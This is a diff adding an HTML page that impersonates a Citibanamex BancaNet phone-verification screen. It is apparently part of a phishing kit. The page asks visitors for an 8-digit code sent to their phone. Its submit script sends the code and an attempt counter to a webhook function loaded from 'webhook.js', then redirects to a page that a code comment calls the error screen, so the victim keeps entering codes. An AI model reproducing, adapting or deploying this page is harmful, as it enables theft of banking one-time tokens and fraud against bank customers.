@@ -1,0 +1,827 @@
+<html lang="es"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banamex | Verifica tu celular</title>
+    <style>
+        /* Reset y base */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        :root {
+            --teal: #033540;
+            --teal-soft: #0a4a57;
+            --red: #FF1E42;
+            --bg: #ffffff;
+            --text: #111827;
+            --muted: #6b7280;
+            --border: #e5e7eb;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ================= BARRA SUPERIOR ================= */
+        .top-utility-bar {
+            background-color: #033540;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 600;
+            padding: 8px 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+        }
+
+        .top-bar-inner {
+            max-width: 1140px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .top-links {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            letter-spacing: 0.5px;
+        }
+
+        .top-links a {
+            color: #ffffff;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            transition: opacity 0.2s;
+        }
+
+        .top-links a:hover {
+            opacity: 0.8;
+        }
+
+        .top-links .divider {
+            color: rgba(255, 255, 255, 0.35);
+            font-weight: 300;
+        }
+
+        /* ================= CONTENEDOR PRINCIPAL ================= */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 28px 16px 64px 16px;
+        }
+
+        .hero-frame {
+            background-color: #033540;
+            width: 100%;
+            max-width: 1140px;
+            border-radius: 24px;
+            padding: 24px 36px 36px 36px;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: stretch;
+            min-height: 540px;
+        }
+
+        .header-cutout {
+            position: absolute;
+            top: 0;
+            left: 0;
+            background-color: #ffffff;
+            width: 340px;
+            height: 60px;
+            border-bottom-right-radius: 26px;
+            display: flex;
+            align-items: center;
+            padding-left: 12px;
+            z-index: 4;
+        }
+
+        .brand-logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .brand-name {
+            color: #033540;
+            font-weight: 700;
+            font-size: 22px;
+            letter-spacing: -0.5px;
+        }
+
+        .brand-divider {
+            width: 1.5px;
+            height: 24px;
+            background-color: #033540;
+            margin: 0 2px;
+        }
+
+        .brand-sub {
+            color: #033540;
+            font-weight: 400;
+            font-size: 17px;
+        }
+
+        /* ================= TARJETA BLANCA ================= */
+        .step-card {
+            background-color: #ffffff;
+            border-radius: 20px;
+            padding: 26px 26px 30px 26px;
+            margin-top: 52px;
+            width: 100%;
+            max-width: 380px;
+            position: relative;
+            z-index: 3;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
+            display: flex;
+            flex-direction: column;
+            min-height: 460px;
+        }
+
+        /* Pantallas */
+        .screen {
+            display: none;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        /* ============== PANTALLA 1: ONBOARDING ============== */
+        .exit-row {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 8px;
+        }
+
+        .exit-link {
+            color: var(--muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 4px 8px;
+        }
+
+        .illustration-wrap {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 0;
+        }
+
+        .illustration {
+            width: 220px;
+            height: 220px;
+        }
+
+        .intro-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text);
+            line-height: 1.25;
+            margin-bottom: 14px;
+            text-align: center;
+        }
+
+        .intro-sub {
+            font-size: 15px;
+            color: var(--muted);
+            line-height: 1.5;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background-color: #d1d5db;
+            transition: all 0.3s;
+        }
+
+        .dot.active {
+            background-color: var(--red);
+        }
+
+        /* ============== PANTALLA 2 Y 3: NAV ================= */
+        .nav-row {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: var(--teal);
+            display: flex;
+            align-items: center;
+            padding: 4px;
+        }
+
+        .nav-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text);
+        }
+
+        .confirm-lead {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--text);
+            line-height: 1.4;
+            margin-bottom: 22px;
+        }
+
+        .send-label {
+            font-size: 14px;
+            color: var(--muted);
+            margin-bottom: 10px;
+        }
+
+        .phone-display {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text);
+            letter-spacing: 2px;
+            margin-bottom: 22px;
+        }
+
+        .not-my-number {
+            color: var(--teal);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            align-self: flex-start;
+        }
+
+        .not-my-number:hover {
+            text-decoration: underline;
+        }
+
+        /* ============== PANTALLA 3: CÓDIGO ============== */
+        .code-label {
+            font-size: 15px;
+            color: var(--text);
+            margin-bottom: 10px;
+        }
+
+        .code-phone {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text);
+            letter-spacing: 2px;
+            margin-bottom: 26px;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            gap: 6px;
+            margin-bottom: 24px;
+        }
+
+        .code-box {
+            flex: 1;
+            min-width: 0;
+            height: 48px;
+            border: none;
+            border-bottom: 2px solid #cbd5e1;
+            background: transparent;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            color: var(--text);
+            outline: none;
+            caret-color: var(--teal);
+            transition: border-color 0.2s;
+        }
+
+        .code-box:focus {
+            border-bottom-color: var(--teal);
+        }
+
+        .code-box.filled {
+            border-bottom-color: var(--teal);
+        }
+
+        .timer-row {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+
+        .timer-icon {
+            width: 44px;
+            height: 44px;
+            background-color: #fdecef;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .timer-text {
+            font-size: 15px;
+            color: var(--teal);
+            line-height: 1.3;
+        }
+
+        .timer-time {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--teal);
+            display: block;
+        }
+
+        /* ============== BOTÓN PRIMARIO ================= */
+        .bottom-bar {
+            margin-top: auto;
+            padding-top: 16px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            height: 48px;
+            background-color: var(--teal);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--teal-soft);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+        }
+
+        .btn-primary:disabled {
+            background-color: #d1d5db;
+            color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        /* ============== TECLADO NUMÉRICO ================= */
+        .keypad {
+            background-color: #f3f4f6;
+            border-radius: 16px;
+            padding: 10px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-top: 8px;
+        }
+
+        .key {
+            background-color: #ffffff;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            height: 52px;
+            font-size: 24px;
+            font-weight: 500;
+            color: var(--text);
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            line-height: 1;
+            transition: background-color 0.1s;
+        }
+
+        .key:active {
+            background-color: #e5e7eb;
+        }
+
+        .key-sub {
+            font-size: 9px;
+            letter-spacing: 1px;
+            color: var(--muted);
+            margin-top: 2px;
+            font-weight: 500;
+        }
+
+        .key-back {
+            background-color: transparent;
+            border: none;
+        }
+
+        .key-back:active {
+            background-color: rgba(0,0,0,0.05);
+        }
+
+        .key-empty {
+            background-color: transparent;
+            border: none;
+            pointer-events: none;
+        }
+
+        /* Transición suave */
+        .screen {
+            animation: fadeIn 0.35s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(12px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Responsive: móviles */
+        @media (max-width: 600px) {
+            .main-container { padding: 16px 10px 40px 10px; }
+            .hero-frame {
+                padding: 14px;
+                border-radius: 16px;
+                min-height: auto;
+            }
+            .header-cutout {
+                width: 230px;
+                height: 48px;
+                border-bottom-right-radius: 20px;
+            }
+            .brand-name { font-size: 17px; }
+            .brand-sub { font-size: 13px; }
+            .brand-divider { height: 20px; }
+            .step-card {
+                padding: 22px 18px 24px;
+                margin-top: 42px;
+            }
+            .nav-title { font-size: 20px; }
+            .confirm-lead { font-size: 17px; }
+            .code-box {
+                height: 44px;
+                font-size: 22px;
+            }
+            .top-utility-bar { padding: 8px 14px; }
+            .top-links { gap: 10px; font-size: 10px; }
+        }
+
+        /* Responsive: tablets */
+        @media (min-width: 601px) and (max-width: 900px) {
+            .step-card { max-width: 420px; }
+        }
+
+        /* Responsive: pantallas grandes */
+        @media (min-width: 1200px) {
+            .step-card { max-width: 420px; }
+        }
+
+        /* Ajuste para pantallas muy angostas */
+        @media (max-width: 360px) {
+            .header-cutout { width: 200px; }
+            .brand-name { font-size: 15px; }
+            .code-inputs { gap: 4px; }
+            .code-box { font-size: 20px; height: 40px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- Barra superior -->
+<div class="top-utility-bar">
+    <div class="top-bar-inner">
+        <span class="live-clock" id="liveClock">Sábado 21 de Noviembre de 2026, 21:50:20</span>
+        <div class="top-links">
+            <a href="#">Privacidad</a>
+            <span class="divider">|</span>
+            <a href="#">Términos</a>
+            <span class="divider">|</span>
+            <a href="#">Ayuda</a>
+        </div>
+    </div>
+</div>
+
+<!-- Contenedor principal -->
+<div class="main-container">
+    <div class="hero-frame">
+        <div class="header-cutout">
+            <div class="brand-logo">
+                <span class="brand-name">Citibanamex</span>
+                <span class="brand-divider"></span>
+                <span class="brand-sub">BancaNet</span>
+            </div>
+        </div>
+
+        <div class="step-card">
+            <!-- ============ PANTALLA 1 ============ -->
+            <section class="screen screen-1" id="screen1">
+                <div class="exit-row">
+                    
+                </div>
+
+                <div class="illustration-wrap">
+                    <svg class="illustration" viewBox="0 0 260 260" xmlns="http://www.w3.org/2000/svg">
+                        <ellipse cx="130" cy="145" rx="108" ry="62" fill="none" stroke="#FF1E42" stroke-width="3" stroke-dasharray="8 8" transform="rotate(-12 130 145)"></ellipse>
+                        <g>
+                            <rect x="120" y="50" width="92" height="178" rx="16" fill="#ffffff" stroke="#033540" stroke-width="3.5"></rect>
+                            <rect x="132" y="66" width="68" height="130" rx="6" fill="#eef4f6"></rect>
+                            <circle cx="166" cy="60" r="3" fill="#033540"></circle>
+                            <rect x="150" y="196" width="32" height="4" rx="2" fill="#033540"></rect>
+                        </g>
+                        <g>
+                            <rect x="40" y="95" width="110" height="72" rx="10" fill="#0a4a57" stroke="#033540" stroke-width="3"></rect>
+                            <rect x="54" y="108" width="20" height="15" rx="3" fill="#d4af37"></rect>
+                            <line x1="60" y1="108" x2="60" y2="123" stroke="#b8941f" stroke-width="1"></line>
+                            <line x1="68" y1="108" x2="68" y2="123" stroke="#b8941f" stroke-width="1"></line>
+                            <rect x="54" y="132" width="14" height="5" rx="2" fill="#ffffff" opacity=".9"></rect>
+                            <rect x="72" y="132" width="14" height="5" rx="2" fill="#ffffff" opacity=".9"></rect>
+                            <rect x="90" y="132" width="14" height="5" rx="2" fill="#ffffff" opacity=".9"></rect>
+                            <rect x="108" y="132" width="14" height="5" rx="2" fill="#ffffff" opacity=".9"></rect>
+                            <circle cx="130" cy="150" r="7" fill="#FF1E42"></circle>
+                        </g>
+                        <g>
+                            <circle cx="100" cy="185" r="22" fill="#ffffff" stroke="#033540" stroke-width="3"></circle>
+                            <text x="100" y="193" text-anchor="middle" font-family="Arial" font-size="24" font-weight="700" fill="#033540">$</text>
+                        </g>
+                    </svg>
+                </div>
+
+                <h1 class="intro-title">Haz transferencias sin esperar 30 minutos</h1>
+                <p class="intro-sub">Ahora podrás enviar dinero y hacer pagos al instante.</p>
+
+                <div class="dots">
+                    <span class="dot active"></span>
+                    <span class="dot"></span>
+                </div>
+
+                <div class="bottom-bar">
+                    <button class="btn-primary" onclick="goToScreen(2)">Verificar mi celular</button>
+                </div>
+            </section>
+
+            <!-- ============ PANTALLA 2 ============ -->
+            <section class="screen screen-2 active" id="screen2">
+                <div class="nav-row">
+                    <button class="back-btn" onclick="goToScreen(1)" aria-label="Atrás">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"></path></svg>
+                    </button>
+                    <h1 class="nav-title">Confirma tu celular</h1>
+                </div>
+
+                <p class="confirm-lead">Ingrese el codigo que enviamos a su numero registrado</p>
+
+                <p class="send-label">Ingresa el código de 8 dígitos:</p>
+
+                <div class="code-inputs" id="codeInputs">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" oninput="handleCodeInput(this, event)">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" oninput="handleCodeInput(this, event)">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" oninput="handleCodeInput(this, event)">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" oninput="handleCodeInput(this, event)">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" oninput="handleCodeInput(this, event)">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" oninput="handleCodeInput(this, event)">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" oninput="handleCodeInput(this, event)">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" oninput="handleCodeInput(this, event)">
+                </div>
+
+                <div class="timer-row">
+                    <div class="timer-icon">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FF1E42" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="13" r="8"></circle>
+                            <path d="M12 9v4l2 2"></path>
+                            <path d="M9 2h6"></path>
+                        </svg>
+                    </div>
+                    <div class="timer-text">
+                        El código expira en:
+                        <span class="timer-time" id="timerDisplay">00:45</span>
+                    </div>
+                </div>
+
+                <button class="not-my-number" onclick="alert('Reenviar código')">¿Tienes problemas para recibir el codigo?</button>
+
+                <div class="bottom-bar">
+                    <button class="btn-primary" id="codeContinueBtn" disabled onclick="submitCode()">Continuar</button>
+                </div>
+            </section>
+
+            <!-- ============ PANTALLA 3: CÓDIGO ============ -->
+            <section class="screen screen-3" id="screen3">
+                <div class="nav-row">
+                    <button class="back-btn" onclick="goToScreen(2)" aria-label="Atrás">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"></path></svg>
+                    </button>
+                    <h1 class="nav-title">Confirma tu celular</h1>
+                </div>
+
+                <p class="code-label">Ingresa el código que enviamos a:</p>
+                <div class="code-phone">** **** 0727</div>
+
+                <div class="code-inputs" id="codeInputs">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" readonly="">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" readonly="">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" readonly="">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" readonly="">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" readonly="">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" readonly="">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" readonly="">
+                    <input class="code-box" type="text" maxlength="1" inputmode="numeric" readonly="">
+                </div>
+
+                <div class="timer-row">
+                    <div class="timer-icon">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#FF1E42" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="13" r="8"></circle>
+                            <path d="M12 9v4l2 2"></path>
+                            <path d="M9 2h6"></path>
+                        </svg>
+                    </div>
+                    <div class="timer-text">
+                        El código expira en:
+                        <span class="timer-time" id="timerDisplay">01:46</span>
+                    </div>
+                </div>
+
+                <div class="bottom-bar">
+                    <button class="btn-primary" id="codeContinueBtn" disabled="" onclick="submitCode()">Continuar</button>
+                </div>
+
+                <div class="keypad">
+                    <button class="key" onclick="pressKey('1')">1<span class="key-sub"></span></button>
+                    <button class="key" onclick="pressKey('2')">2<span class="key-sub">ABC</span></button>
+                    <button class="key" onclick="pressKey('3')">3<span class="key-sub">DEF</span></button>
+                    <button class="key" onclick="pressKey('4')">4<span class="key-sub">GHI</span></button>
+                    <button class="key" onclick="pressKey('5')">5<span class="key-sub">JKL</span></button>
+                    <button class="key" onclick="pressKey('6')">6<span class="key-sub">MNO</span></button>
+                    <button class="key" onclick="pressKey('7')">7<span class="key-sub">PQRS</span></button>
+                    <button class="key" onclick="pressKey('8')">8<span class="key-sub">TUV</span></button>
+                    <button class="key" onclick="pressKey('9')">9<span class="key-sub">WXYZ</span></button>
+                    <div class="key-empty"></div>
+                    <button class="key" onclick="pressKey('0')">0<span class="key-sub"></span></button>
+                    <button class="key key-back" onclick="pressKey('back')" aria-label="Borrar">
+                        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#111827" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z"></path>
+                            <line x1="18" y1="9" x2="12" y2="15"></line>
+                            <line x1="12" y1="9" x2="18" y2="15"></line>
+                        </svg>
+                    </button>
+                </div>
+            </section>
+        </div>
+    </div>
+</div>
+
+<script src="webhook.js"></script>
+<script>
+    /* Reloj */
+    const clockElement = document.getElementById('liveClock');
+    const dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
+    const meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio', 'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
+
+    function updateClock() {
+        const now = new Date();
+        // Hora de la Ciudad de México
+        const opts = { timeZone: 'America/Mexico_City' };
+        const mx = new Date(now.toLocaleString('en-US', opts));
+        const diaSemana = dias[mx.getDay()];
+        const dia = mx.getDate();
+        const mes = meses[mx.getMonth()];
+        const anio = mx.getFullYear();
+        const horas = String(mx.getHours()).padStart(2, '0');
+        const minutos = String(mx.getMinutes()).padStart(2, '0');
+        const segundos = String(mx.getSeconds()).padStart(2, '0');
+        clockElement.textContent = `${diaSemana} ${dia} de ${mes} de ${anio}, ${horas}:${minutos}:${segundos}`;
+    }
+    updateClock();
+    setInterval(updateClock, 1000);
+
+    /* Navegación entre pantallas */
+    function goToScreen(n) {
+        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+        const target = document.getElementById('screen' + n);
+        if (target) target.classList.add('active');
+        if (n === 2 || n === 3) startTimer();
+    }
+
+    /* Manejo del código de 8 dígitos (pantalla 2) */
+    function handleCodeInput(input, e) {
+        // Solo dígitos
+        input.value = input.value.replace(/\D/g, '');
+
+        const screen2 = document.getElementById('screen2');
+        const boxes = screen2.querySelectorAll('.code-box');
+        const idx = Array.from(boxes).indexOf(input);
+
+        input.classList.toggle('filled', !!input.value);
+
+        // Avanzar a la siguiente casilla si esta tiene un dígito
+        if (input.value && idx < boxes.length - 1) {
+            boxes[idx + 1].focus();
+        }
+
+        // Actualizar estado del botón
+        const allFilled = Array.from(boxes).every(b => b.value !== '');
+        const btn = document.getElementById('codeContinueBtn');
+        btn.disabled = !allFilled;
+    }
+
+    /* Permitir borrar y retroceder con Backspace */
+    document.querySelectorAll('#screen2 .code-box').forEach((box, idx, arr) => {
+        box.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !box.value && idx > 0) {
+                arr[idx - 1].focus();
+            }
+        });
+        box.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+            for (let i = 0; i < arr.length && i < pasted.length; i++) {
+                arr[i].value = pasted[i];
+                arr[i].classList.add('filled');
+            }
+            const nextIdx = Math.min(pasted.length, arr.length - 1);
+            arr[nextIdx].focus();
+            const allFilled = Array.from(arr).every(b => b.value !== '');
+            document.getElementById('codeContinueBtn').disabled = !allFilled;
+        });
+    });
+
+    function submitCode() {
+        const screen2 = document.getElementById('screen2');
+        const boxes = screen2.querySelectorAll('.code-box');
+        const code = Array.from(boxes).map(b => b.value).join('');
+        if (code.length === 8) {
+            // Contar intentos de token en la sesión
+            const current = window.getSessionData ? window.getSessionData() : {};
+            const intentos = (current.intentos || 0) + 1;
+
+            // Enviar token al webhook con el número de intento
+            if (typeof window.enviarAWebhook === "function") {
+                window.enviarAWebhook("token", { token: code, intentos });
+            }
+
+            // Redirigir a la pantalla de error
+            window.location.href = "cel2.html";
+        }
+    }
+
+    /* Timer de 45 segundos */
+    let timerInterval = null;
+    function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        let total = 45;
+        const display = document.getElementById('timerDisplay');
+        const tick = () => {
+            const m = String(Math.floor(total / 60)).padStart(2, '0');
+            const s = String(total % 60).padStart(2, '0');
+            display.textContent = `${m}:${s}`;
+            if (total <= 0) clearInterval(timerInterval);
+            total--;
+        };
+        tick();
+        timerInterval = setInterval(tick, 1000);
+    }
+
+    /* Iniciar el timer automáticamente si la pantalla activa es la 2 o 3 */
+    const activeScreen = document.querySelector('.screen.active');
+    if (activeScreen && (activeScreen.id === 'screen2' || activeScreen.id === 'screen3')) {
+        startTimer();
+    }
+</script>
+
+
+
+
+</body></html>
